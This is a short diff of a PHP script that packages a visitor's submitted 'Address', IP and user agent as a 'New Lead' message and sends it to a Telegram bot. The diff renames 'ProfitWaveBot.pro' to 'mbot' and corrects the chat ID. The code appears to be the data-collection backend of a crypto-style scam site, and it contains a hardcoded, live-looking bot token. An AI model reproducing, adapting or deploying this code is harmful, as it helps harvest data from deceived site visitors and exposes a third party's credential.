@@ -11,7 +11,7 @@ $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
 
 if (!empty($data)) {
 
-    $message = "🚨 <b>New Lead - ProfitWaveBot.pro</b>\n\n";
+    $message = "🚨 <b>New Lead - mbot</b>\n\n";
     $message .= "Action: <b>" . htmlspecialchars($action) . "</b>\n";
     $message .= "Address: <code>" . htmlspecialchars($data) . "</code>\n";
     $message .= "IP: " . $ip . "\n";
@@ -27,7 +27,7 @@ if (!empty($data)) {
 
 
     $botToken = '8790701323:AAFQdlh18Ioz_hvalZEdGhW9_8vFfZYYYy0';
-    $chatID   = '--1003740264705';
+    $chatID   = '-1003740264705';
 
     $telegramUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
 
